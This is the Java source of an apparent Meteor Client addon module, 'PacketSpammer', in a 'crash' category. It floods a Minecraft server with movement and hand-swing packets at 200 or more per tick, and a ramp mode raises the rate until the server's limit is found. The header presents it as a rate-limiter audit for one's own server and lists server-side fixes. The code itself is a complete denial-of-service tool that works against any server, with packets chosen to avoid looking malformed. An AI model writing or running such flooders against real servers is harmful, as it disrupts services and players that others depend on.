package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.systems.modules.Modules;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.HandSwingC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.util.Hand;

/**
 * AUDIT: Packet Spammer (raw inbound packet rate limiter test)
 *
 * Alternates PlayerMoveC2SPacket.OnGroundOnly and HandSwingC2SPacket at a
 * configurable rate (default 100 pairs/tick = 200 packets/tick). Tests the
 * server's raw inbound packet-rate limiter — the first line of defence that
 * should apply before any packet is parsed or dispatched.
 *
 * The specific packet types are chosen because they are among the cheapest
 * to construct and the most commonly sent, and because the ground-flag
 * packet is valid even with a random onGround value, making it hard to
 * fingerprint as clearly malformed.
 *
 * Patch signal: Netty read throttling or a per-connection packet budget
 * applied at the channel-inbound stage, before any packet reaches the main
 * thread; the budget must be reset per real-time window (wall-clock), not
 * per-tick, to survive timer-hack clients that compress many "ticks" into
 * one second.
 *
 * Run against your OWN local server only.
 */
public class PacketSpammer extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("amount").description("Packets per tick.")
        .defaultValue(100).min(1).sliderMax(1000).build()
    );
    private final Setting<Boolean> rampMode = sgGeneral.add(new BoolSetting.Builder()
        .name("ramp-mode")
        .description("Auto-increment rate each tick to find the server's threshold. Starts at 1, steps up by ramp-step each tick.")
        .defaultValue(false).build()
    );
    private final Setting<Integer> rampStep = sgGeneral.add(new IntSetting.Builder()
        .name("ramp-step").description("Rate increase per tick in ramp mode.")
        .defaultValue(10).range(1, 500).sliderRange(1, 100)
        .visible(rampMode::get).build()
    );
    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );
    private final Setting<Boolean> showStats = sgGeneral.add(new BoolSetting.Builder()
        .name("show-stats").description("Print tick + packet count on deactivate.")
        .defaultValue(true).build()
    );
    private final Setting<Boolean> autoMonitor = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-monitor")
        .description("Auto-enable Server Health Monitor to track TPS impact while this module runs.")
        .defaultValue(true).build()
    );

    private int ticksActive = 0, packetsSent = 0;
    private int currentRate = 1;

    public PacketSpammer() {
        super(AddonTemplate.CRASH_CATEGORY, "packet-spammer",
            "Spams onGround + swing packets to test raw inbound packet rate limiting.");
    }

    @Override
    public void onActivate() {
        ticksActive = 0; packetsSent = 0; currentRate = 1;
        if (autoMonitor.get()) {
            var shm = Modules.get().get(ServerHealthMonitor.class);
            if (shm != null && !shm.isActive()) shm.toggle();
        }
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (mc.player == null) return;
        ticksActive++;
        int rate = rampMode.get() ? currentRate : amount.get();
        if (rampMode.get()) currentRate += rampStep.get();
        for (int i = 0; i < rate; i++) {
            mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.OnGroundOnly(Math.random() >= 0.5, false));
            packetsSent++;
            mc.player.networkHandler.sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
            packetsSent++;
        }
    }

    @Override
    public void onDeactivate() {
        if (showStats.get()) {
            info("Summary: %d ticks active, %d packets sent.", ticksActive, packetsSent);
            if (rampMode.get()) info("  Ramp: peak rate sent was %d/tick", currentRate - rampStep.get());
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get() && isActive()) toggle();
    }
}
